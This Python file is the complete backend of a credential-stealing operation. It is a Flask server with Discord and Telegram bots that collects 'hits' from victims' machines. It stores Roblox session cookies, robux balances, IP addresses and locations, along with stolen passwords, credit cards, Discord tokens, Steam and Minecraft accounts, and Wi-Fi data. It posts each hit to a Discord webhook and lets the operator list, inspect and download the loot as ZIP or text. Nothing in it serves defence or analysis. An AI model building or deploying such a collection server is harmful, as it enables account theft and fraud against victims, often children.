import sys
import json
import sqlite3
import threading
import time
import requests
import io
import zipfile
from datetime import datetime
from flask import Flask, request, jsonify, send_file
import os

# ---------- CONFIG ----------
DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "-5330491816")
ENABLE_TELEGRAM = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")
API_TOKEN = os.environ.get("API_TOKEN", "123")

PORT = os.environ.get("PORT", "5000")
API_BASE_URL = f"http://127.0.0.1:{PORT}"

DB_FILE = "hits.db"

# ---------- Database ----------
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS hits (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    username TEXT,
                    robux INTEGER,
                    premium TEXT,
                    ip TEXT,
                    location TEXT,
                    cookie TEXT,
                    raw_data TEXT
                )''')
    conn.commit()
    conn.close()
    print("[DB] Table ready.")

init_db()

def add_hit(data):
    roblox = data.get('roblox', {})
    system = data.get('system', {})

    username = roblox.get('username') or data.get('username', 'N/A')
    robux_val = roblox.get('robux') or data.get('robux', 0)
    try:
        robux = int(robux_val)
    except:
        robux = 0
    premium = roblox.get('premium') or data.get('premium', 'False')
    if isinstance(premium, bool):
        premium = str(premium)
    ip = system.get('ip') or data.get('ip', 'N/A')
    location = system.get('location') or data.get('location', 'N/A')
    cookie = roblox.get('cookie') or data.get('cookie', 'N/A')
    timestamp = data.get('timestamp') or datetime.now().isoformat()

    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''INSERT INTO hits (timestamp, username, robux, premium, ip, location, cookie, raw_data)
                     VALUES (?,?,?,?,?,?,?,?)''',
                  (timestamp, username, robux, premium, ip, location, cookie, json.dumps(data)))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"[DB] Insert ERROR: {e}")
        return False

def get_all_hits():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT id, timestamp, username, robux, premium, ip, location, cookie, raw_data FROM hits ORDER BY id DESC')
    rows = c.fetchall()
    conn.close()
    return [{'id':r[0], 'timestamp':r[1], 'username':r[2], 'robux':r[3],
             'premium':r[4], 'ip':r[5], 'location':r[6], 'cookie':r[7][:30]+'...', 'raw_data':r[8]} for r in rows]

def get_hit_by_id(hit_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT id, timestamp, username, robux, premium, ip, location, cookie, raw_data FROM hits WHERE id=?', (hit_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return {'id':row[0], 'timestamp':row[1], 'username':row[2], 'robux':row[3],
                'premium':row[4], 'ip':row[5], 'location':row[6], 'cookie':row[7], 'raw_data':row[8]}
    return None

def get_total_hits():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM hits')
    count = c.fetchone()[0]
    conn.close()
    return count

def get_top_robux():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT username, robux FROM hits ORDER BY robux DESC LIMIT 1')
    row = c.fetchone()
    conn.close()
    return row if row else (None, 0)

def summarize_hit(raw_data_str):
    """Extract counts from raw_data."""
    try:
        data = json.loads(raw_data_str)
    except:
        return {}
    summary = {}
    passwords = data.get('passwords', {})
    cookies = data.get('cookies', {})
    credit_cards = data.get('credit_cards', {})
    discord_tokens = data.get('discord_tokens', [])
    steam = data.get('steam', [])
    minecraft = data.get('minecraft', [])
    wifi = data.get('wifi', [])
    summary['passwords_count'] = sum(len(lst) for lst in passwords.values()) if isinstance(passwords, dict) else 0
    summary['cookies_count'] = sum(len(lst) for lst in cookies.values()) if isinstance(cookies, dict) else 0
    summary['credit_cards_count'] = sum(len(lst) for lst in credit_cards.values()) if isinstance(credit_cards, dict) else 0
    summary['discord_tokens_count'] = len(discord_tokens) if isinstance(discord_tokens, list) else 0
    summary['steam_count'] = len(steam) if isinstance(steam, list) else 0
    summary['minecraft_count'] = len(minecraft) if isinstance(minecraft, list) else 0
    summary['wifi_count'] = len(wifi) if isinstance(wifi, list) else 0
    return summary

# ---------- Webhook ----------
def send_discord_webhook(hit):
    if not DISCORD_WEBHOOK_URL:
        return
    try:
        from discord_webhook import DiscordWebhook, DiscordEmbed
        roblox = hit.get('roblox', {})
        system = hit.get('system', {})
        username = roblox.get('username') or hit.get('username', 'N/A')
        robux = roblox.get('robux') or hit.get('robux', 0)
        ip = system.get('ip') or hit.get('ip', 'N/A')
        location = system.get('location') or hit.get('location', 'N/A')
        cookie = roblox.get('cookie') or hit.get('cookie', 'N/A')

        webhook = DiscordWebhook(url=DISCORD_WEBHOOK_URL)
        embed = DiscordEmbed(title="🎯 New Hit!", color=0x00ff00)
        embed.add_embed_field(name="Username", value=username)
        embed.add_embed_field(name="Robux", value=robux)
        embed.add_embed_field(name="IP", value=ip)
        embed.add_embed_field(name="Location", value=location)
        embed.add_embed_field(name="Cookie", value=f"```{cookie[:50]}...```")
        embed.set_timestamp()
        webhook.add_embed(embed)
        webhook.execute()
    except Exception as e:
        print(f"[Webhook] Error: {e}")

# ---------- Flask ----------
app = Flask(__name__)

_bots_started = False

def start_bots():
    global _bots_started
    if _bots_started:
        return
    _bots_started = True
    time.sleep(5)
    if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN":
        threading.Thread(target=run_discord_bot, daemon=True).start()
    if ENABLE_TELEGRAM and TELEGRAM_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN":
        threading.Thread(target=run_telegram_bot, daemon=True).start()

@app.before_request
def before_first_request():
    start_bots()

# ---------- Routes ----------
@app.route('/log_hit', methods=['POST'])
def log_hit():
    data = request.get_json()
    if not data:
        return jsonify({"error": "No JSON"}), 400
    if 'timestamp' not in data:
        data['timestamp'] = datetime.now().isoformat()
    success = add_hit(data)
    if not success:
        return jsonify({"error": "DB insert failed"}), 500
    threading.Thread(target=send_discord_webhook, args=(data,)).start()
    return jsonify({"status": "ok"}), 200

@app.route('/get_hits', methods=['GET'])
def get_hits():
    auth = request.headers.get('X-Auth-Token')
    if auth != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    try:
        return jsonify(get_all_hits())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/total', methods=['GET'])
def total():
    auth = request.headers.get('X-Auth-Token')
    if auth != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    try:
        return jsonify({"total": get_total_hits()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/top', methods=['GET'])
def top():
    auth = request.headers.get('X-Auth-Token')
    if auth != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    try:
        user, robux = get_top_robux()
        return jsonify({"username": user, "robux": robux})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/hit/<int:hit_id>', methods=['GET'])
def get_hit_detail(hit_id):
    auth = request.headers.get('X-Auth-Token')
    if auth != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    hit = get_hit_by_id(hit_id)
    if not hit:
        return jsonify({"error": "Hit not found"}), 404
    return jsonify(hit)

@app.route('/download', methods=['GET'])
def download_zip():
    auth = request.headers.get('X-Auth-Token')
    if auth != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    try:
        hits = get_all_hits()
        if not hits:
            return jsonify({"error": "No hits"}), 404

        memory_file = io.BytesIO()
        with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
            for h in hits:
                fname = f"{h['timestamp'].replace(':', '-')}_{h['username']}.json"
                zf.writestr(fname, json.dumps(json.loads(h['raw_data']), indent=2))
            summary = "\n".join([f"{h['id']}: {h['timestamp']} - {h['username']} ({h['robux']} R$)" for h in hits])
            zf.writestr("summary.txt", f"Total hits: {len(hits)}\n\n{summary}")

        memory_file.seek(0)
        return send_file(memory_file, download_name='all_hits.zip', as_attachment=True)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/download_txt', methods=['GET'])
def download_txt():
    auth = request.headers.get('X-Auth-Token')
    if auth != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401
    try:
        hits = get_all_hits()
        if not hits:
            return jsonify({"error": "No hits"}), 404
        lines = [f"Total hits: {len(hits)}\n"]
        for h in hits:
            lines.append(f"ID: {h['id']}")
            lines.append(f"Timestamp: {h['timestamp']}")
            lines.append(f"Username: {h['username']}")
            lines.append(f"Robux: {h['robux']}")
            lines.append(f"Premium: {h['premium']}")
            lines.append(f"IP: {h['ip']}")
            lines.append(f"Location: {h['location']}")
            lines.append(f"Cookie: {h['cookie']}")
            lines.append("-" * 40)
        return "\n".join(lines), 200, {'Content-Type': 'text/plain'}
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/')
def index():
    return jsonify({
        "status": "Server is running",
        "endpoints": [
            "/log_hit (POST)",
            "/get_hits (GET)",
            "/total (GET)",
            "/top (GET)",
            "/hit/<id> (GET)",
            "/download (GET) – ZIP",
            "/download_txt (GET) – text"
        ]
    })

# ---------- Discord Bot ----------
def run_discord_bot():
    import discord
    from discord.ext import commands
    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix='/', intents=intents)

    @bot.event
    async def on_ready():
        print(f'[Discord] Logged in as {bot.user}')

    @bot.command(name='howmanyhits')
    async def how_many_hits(ctx):
        try:
            resp = requests.get(f"{API_BASE_URL}/get_hits", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
            if resp.status_code != 200:
                await ctx.send(f"Error (status {resp.status_code}): {resp.text}")
                return
            hits = resp.json()
            if not hits:
                await ctx.send("No hits yet.")
                return
            total = len(hits)
            display = hits[:10]
            lines = [f"**Total hits: {total}**"]
            for h in display:
                # Get summary from raw_data
                summary = summarize_hit(h['raw_data'])
                extra = f" [Pw:{summary.get('passwords_count',0)} Ck:{summary.get('cookies_count',0)} CC:{summary.get('credit_cards_count',0)} Tok:{summary.get('discord_tokens_count',0)}]"
                lines.append(f"`{h['timestamp']}` | **{h['username']}** | {h['robux']} R$ | {h['ip']}{extra}")
            if total > 10:
                lines.append(f"... and {total - 10} more.")
            await ctx.send("\n".join(lines))
        except Exception as e:
            await ctx.send(f"Error: {e}")

    @bot.command(name='total')
    async def total_hits(ctx):
        try:
            resp = requests.get(f"{API_BASE_URL}/total", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
            if resp.status_code != 200:
                await ctx.send(f"Error (status {resp.status_code}): {resp.text}")
                return
            data = resp.json()
            await ctx.send(f"**Total hits recorded:** {data['total']}")
        except Exception as e:
            await ctx.send(f"Error: {e}")

    @bot.command(name='top')
    async def top_robux(ctx):
        try:
            resp = requests.get(f"{API_BASE_URL}/top", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
            if resp.status_code != 200:
                await ctx.send(f"Error (status {resp.status_code}): {resp.text}")
                return
            data = resp.json()
            if data['username']:
                await ctx.send(f"**Highest Robux:** {data['username']} with {data['robux']} R$")
            else:
                await ctx.send("No hits yet.")
        except Exception as e:
            await ctx.send(f"Error: {e}")

    @bot.command(name='hit')
    async def get_hit(ctx, hit_id: int):
        try:
            resp = requests.get(f"{API_BASE_URL}/hit/{hit_id}", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
            if resp.status_code != 200:
                await ctx.send(f"Error (status {resp.status_code}): {resp.text}")
                return
            data = resp.json()
            # Format the raw data nicely (truncate long strings)
            raw = json.loads(data['raw_data'])
            # Show a summary
            lines = [
                f"**Hit #{data['id']}**",
                f"Timestamp: {data['timestamp']}",
                f"Username: {data['username']}",
                f"Robux: {data['robux']}",
                f"Premium: {data['premium']}",
                f"IP: {data['ip']}",
                f"Location: {data['location']}",
                f"Cookie: `{data['cookie'][:50]}...`",
                "",
                "**Extracted Data Summary:**"
            ]
            passwords = raw.get('passwords', {})
            if passwords:
                lines.append(f"- Passwords: {sum(len(v) for v in passwords.values())} entries")
            cookies = raw.get('cookies', {})
            if cookies:
                lines.append(f"- Cookies: {sum(len(v) for v in cookies.values())} entries")
            credit_cards = raw.get('credit_cards', {})
            if credit_cards:
                lines.append(f"- Credit Cards: {sum(len(v) for v in credit_cards.values())} entries")
            discord_tokens = raw.get('discord_tokens', [])
            if discord_tokens:
                lines.append(f"- Discord Tokens: {len(discord_tokens)}")
            steam = raw.get('steam', [])
            if steam:
                lines.append(f"- Steam accounts: {len(steam)}")
            minecraft = raw.get('minecraft', [])
            if minecraft:
                lines.append(f"- Minecraft accounts: {len(minecraft)}")
            wifi = raw.get('wifi', [])
            if wifi:
                lines.append(f"- Wi-Fi networks: {len(wifi)}")
            # Also show first few passwords as example
            if passwords:
                first = list(passwords.values())[0][0] if passwords else None
                if first:
                    lines.append(f"- Example password: {first.get('url','')} -> {first.get('username','')}:{first.get('password','')[:10]}...")
            await ctx.send("\n".join(lines))
        except Exception as e:
            await ctx.send(f"Error: {e}")

    @bot.command(name='commands')
    async def commands_list(ctx):
        help_text = """
**Available commands:**
`/howmanyhits` – Show 10 most recent hits with summary
`/total` – Show total hit count
`/top` – Show hit with most Robux
`/hit <id>` – Show full details of a specific hit
`/commands` – Show this message
"""
        await ctx.send(help_text)

    bot.run(DISCORD_TOKEN)

# ---------- Telegram Bot ----------
def run_telegram_bot():
    try:
        from telegram import Update
        from telegram.ext import Application, CommandHandler, ContextTypes

        async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
            await update.message.reply_text("Bot is alive! Use /howmanyhits, /total, /top, /hit <id>, /commands")

        async def how_many_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
            try:
                resp = requests.get(f"{API_BASE_URL}/get_hits", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                if resp.status_code != 200:
                    await update.message.reply_text(f"Error (status {resp.status_code})")
                    return
                hits = resp.json()
                if not hits:
                    await update.message.reply_text("No hits yet.")
                    return
                total = len(hits)
                display = hits[:10]
                lines = [f"Total hits: {total}"]
                for h in display:
                    summary = summarize_hit(h['raw_data'])
                    extra = f" [Pw:{summary.get('passwords_count',0)} Ck:{summary.get('cookies_count',0)} CC:{summary.get('credit_cards_count',0)} Tok:{summary.get('discord_tokens_count',0)}]"
                    lines.append(f"{h['timestamp']} | {h['username']} | {h['robux']} R$ | {h['ip']}{extra}")
                if total > 10:
                    lines.append(f"... and {total - 10} more.")
                await update.message.reply_text("\n".join(lines))
            except Exception as e:
                await update.message.reply_text(f"Error: {e}")

        async def total_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
            try:
                resp = requests.get(f"{API_BASE_URL}/total", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                if resp.status_code != 200:
                    await update.message.reply_text(f"Error (status {resp.status_code})")
                    return
                data = resp.json()
                await update.message.reply_text(f"Total hits recorded: {data['total']}")
            except Exception as e:
                await update.message.reply_text(f"Error: {e}")

        async def top_robux(update: Update, context: ContextTypes.DEFAULT_TYPE):
            try:
                resp = requests.get(f"{API_BASE_URL}/top", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                if resp.status_code != 200:
                    await update.message.reply_text(f"Error (status {resp.status_code})")
                    return
                data = resp.json()
                if data['username']:
                    await update.message.reply_text(f"Highest Robux: {data['username']} with {data['robux']} R$")
                else:
                    await update.message.reply_text("No hits yet.")
            except Exception as e:
                await update.message.reply_text(f"Error: {e}")

        async def get_hit(update: Update, context: ContextTypes.DEFAULT_TYPE):
            try:
                # get the hit id from the command arguments
                if not context.args:
                    await update.message.reply_text("Usage: /hit <id>")
                    return
                hit_id = int(context.args[0])
                resp = requests.get(f"{API_BASE_URL}/hit/{hit_id}", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                if resp.status_code != 200:
                    await update.message.reply_text(f"Error (status {resp.status_code})")
                    return
                data = resp.json()
                raw = json.loads(data['raw_data'])
                lines = [
                    f"Hit #{data['id']}",
                    f"Timestamp: {data['timestamp']}",
                    f"Username: {data['username']}",
                    f"Robux: {data['robux']}",
                    f"Premium: {data['premium']}",
                    f"IP: {data['ip']}",
                    f"Location: {data['location']}",
                    f"Cookie: {data['cookie'][:50]}...",
                    "",
                    "Data Summary:"
                ]
                passwords = raw.get('passwords', {})
                if passwords:
                    lines.append(f"- Passwords: {sum(len(v) for v in passwords.values())} entries")
                cookies = raw.get('cookies', {})
                if cookies:
                    lines.append(f"- Cookies: {sum(len(v) for v in cookies.values())} entries")
                credit_cards = raw.get('credit_cards', {})
                if credit_cards:
                    lines.append(f"- Credit Cards: {sum(len(v) for v in credit_cards.values())} entries")
                discord_tokens = raw.get('discord_tokens', [])
                if discord_tokens:
                    lines.append(f"- Discord Tokens: {len(discord_tokens)}")
                steam = raw.get('steam', [])
                if steam:
                    lines.append(f"- Steam accounts: {len(steam)}")
                minecraft = raw.get('minecraft', [])
                if minecraft:
                    lines.append(f"- Minecraft accounts: {len(minecraft)}")
                wifi = raw.get('wifi', [])
                if wifi:
                    lines.append(f"- Wi-Fi networks: {len(wifi)}")
                await update.message.reply_text("\n".join(lines))
            except Exception as e:
                await update.message.reply_text(f"Error: {e}")

        async def commands_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
            help_text = """Available commands:
/howmanyhits – Show 10 most recent hits with summary
/total – Show total hit count
/top – Show hit with most Robux
/hit <id> – Show full details of a specific hit
/commands – Show this message
/start – Check bot is alive"""
            await update.message.reply_text(help_text)

        app_tele = Application.builder().token(TELEGRAM_TOKEN).build()
        app_tele.add_handler(CommandHandler("start", start))
        app_tele.add_handler(CommandHandler("howmanyhits", how_many_hits))
        app_tele.add_handler(CommandHandler("total", total_hits))
        app_tele.add_handler(CommandHandler("top", top_robux))
        app_tele.add_handler(CommandHandler("hit", get_hit))
        app_tele.add_handler(CommandHandler("commands", commands_list))
        print("[Telegram] Bot started polling.")
        app_tele.run_polling()
    except Exception as e:
        print(f"[Telegram] Error: {e}")

# ---------- Main ----------
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--server":
        threading.Thread(target=app.run, kwargs={'host':'0.0.0.0','port':int(PORT),'debug':False}, daemon=True).start()
        time.sleep(2)
        start_bots()
        while True:
            time.sleep(1)
    else:
        print(f"Starting server (gunicorn) on port {PORT} ...")
